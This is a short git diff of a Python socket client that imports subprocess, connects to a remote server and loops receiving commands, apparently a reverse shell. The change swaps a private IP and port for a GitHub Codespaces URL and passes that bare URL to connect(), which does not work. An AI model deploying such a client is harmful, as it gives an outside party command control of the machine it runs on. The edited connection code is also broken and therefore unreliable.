@@ -2,11 +2,10 @@ import socket
 import subprocess
 
 # Connect to the server
-server_ip = '10.20.131.38'  # Change to your server's IP address
-server_port = 9999
+server_ip = 'https://fuzzy-succotash-r4pr45rvv9wv3pqp-9999.app.github.dev/'  # Change to your server's IP address
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((server_ip, server_port))
+client.connect((server_ip))
 
 while True:
     command = client.recv(1024).decode()
